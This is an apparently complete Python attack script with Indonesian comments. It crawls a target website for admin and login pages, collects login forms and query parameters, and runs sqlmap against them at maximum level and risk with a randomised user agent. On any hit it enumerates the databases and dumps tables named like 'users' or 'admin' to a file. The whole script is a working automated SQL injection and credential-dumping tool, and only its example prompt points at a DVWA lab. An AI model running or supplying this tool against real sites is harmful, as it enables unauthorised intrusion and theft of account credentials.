import requests
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import subprocess
import re
from concurrent.futures import ThreadPoolExecutor, as_completed

# Konfigurasi
CRAWL_LIMIT = 100
MAX_THREADS = 10
SQLMAP_PATH = "sqlmap"  # Pastikan sqlmap ada di PATH
TARGET_KEYWORDS = ["users", "user", "admin"]  # Fokus tabel

VISITED = set()
URLS_WITH_PARAMS = []  # list of dict {url, data, method}

def is_login_page(html):
    """Deteksi apakah halaman mengandung password input"""
    soup = BeautifulSoup(html, "html.parser")
    return bool(soup.find("input", {"type": "password"}))

def extract_forms(url, html):
    """Ekstrak form login POST"""
    soup = BeautifulSoup(html, "html.parser")
    forms = []
    for form in soup.find_all("form"):
        method = form.get("method", "get").lower()
        inputs = form.find_all("input")
        has_user = any("user" in (inp.get("name","").lower()) or "email" in (inp.get("name","").lower()) for inp in inputs)
        has_pass = any(inp.get("type") == "password" for inp in inputs)
        
        if method == "post" and has_pass:
            action = form.get("action")
            action_url = urljoin(url, action) if action else url
            # Buat data string dummy untuk sqlmap
            params = []
            for inp in inputs:
                name = inp.get("name")
                if not name: 
                    continue
                if "pass" in name.lower():
                    params.append(f"{name}=*")
                elif "user" in name.lower() or "email" in name.lower():
                    params.append(f"{name}=*")
                else:
                    params.append(f"{name}=test")
            data_str = "&".join(params)
            forms.append({"url": action_url, "data": data_str, "method": "POST"})
    return forms

def crawl(url, target_domain):
    """Merayapi hanya link admin/login"""
    if len(VISITED) >= CRAWL_LIMIT or url in VISITED:
        return
    try:
        response = requests.get(url, timeout=5)
    except:
        return

    VISITED.add(url)
    print(f"[Crawl] {url}")

    # Deteksi form login
    if is_login_page(response.text):
        print(f"[Detect] Halaman login terdeteksi: {url}")
        forms = extract_forms(url, response.text)
        if forms:
            for f in forms:
                print(f"[Form] Login form ditemukan di {f['url']} dengan data {f['data']}")
                URLS_WITH_PARAMS.append(f)

    soup = BeautifulSoup(response.text, "html.parser")
    for link_tag in soup.find_all("a", href=True):
        link = urljoin(url, link_tag["href"])
        parsed = urlparse(link)

        # Fokus hanya halaman admin/login/panel
        if target_domain in link and link not in VISITED:
            if any(word in link.lower() for word in ["admin", "login", "panel"]):
                if parsed.query:
                    URLS_WITH_PARAMS.append({"url": link, "data": None, "method": "GET"})
                crawl(link, target_domain)

def test_sqlmap(target):
    """Menguji target (GET/POST) dengan SQLMap"""
    url = target["url"]
    method = target["method"]
    data = target["data"]

    print(f"\n[+] Menguji kerentanan SQLi: {url} ({method})")
    if method == "POST" and data:
        check_cmd = [
            SQLMAP_PATH, "-u", url, "--data", data,
            "--batch", "--level=5", "--risk=3", "--random-agent"
        ]
    else:
        check_cmd = [
            SQLMAP_PATH, "-u", url,
            "--batch", "--level=5", "--risk=3", "--random-agent"
        ]

    result = subprocess.run(check_cmd, capture_output=True, text=True)

    if re.search(r"the back-end DBMS", result.stdout, re.IGNORECASE):
        print(f"[!!!] Rentan SQLi ditemukan: {url}")
        run_targeted_dump(target)
    else:
        print(f"[-] Tidak rentan: {url}")

def run_targeted_dump(target):
    """Hanya dump tabel users/admin"""
    url = target["url"]
    method = target["method"]
    data = target["data"]

    print("[*] Mencari database...")

    base_cmd = [SQLMAP_PATH, "-u", url, "--batch", "--level=5", "--risk=3", "--threads=10"]
    if method == "POST" and data:
        base_cmd += ["--data", data]

    dbs_cmd = base_cmd + ["--dbs"]
    dbs_result = subprocess.run(dbs_cmd, capture_output=True, text=True)
    databases = re.findall(r"\[\*\] (.+)", dbs_result.stdout)

    if not databases:
        print("[!] Tidak ada database ditemukan.")
        return

    output_file = f"hasil_dump_{urlparse(url).netloc}.txt"
    with open(output_file, "a", encoding="utf-8") as f:
        for db in databases:
            print(f"[DB] {db}")
            print(f"[*] Mencari tabel di {db}...")
            tables_cmd = base_cmd + ["-D", db, "--tables"]
            tables_result = subprocess.run(tables_cmd, capture_output=True, text=True)
            tables = re.findall(r"\|\s*(\w+)\s*\|", tables_result.stdout)

            for table in tables:
                if any(keyword.lower() in table.lower() for keyword in TARGET_KEYWORDS):
                    print(f"[Dump] {db}.{table}")
                    dump_cmd = base_cmd + ["-D", db, "-T", table, "--dump"]
                    dump_result = subprocess.run(dump_cmd, capture_output=True, text=True)
                    print(dump_result.stdout)
                    f.write(dump_result.stdout + "\n")

if __name__ == "__main__":
    TARGET = input("Masukkan URL target (contoh: http://localhost/dvwa/): ").strip()
    if not TARGET.startswith("http"):
        print("[!] URL harus diawali http:// atau https://")
        exit()

    TARGET_DOMAIN = urlparse(TARGET).netloc

    print("[*] Mulai crawling...")
    crawl(TARGET, TARGET_DOMAIN)

    print(f"\n[!] Total target (admin/login dengan parameter/form) ditemukan: {len(URLS_WITH_PARAMS)}")

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = [executor.submit(test_sqlmap, target) for target in URLS_WITH_PARAMS]
        for future in as_completed(futures):
            future.result()

    print("\n[✓] Proses selesai. Hasil tersimpan di file.")
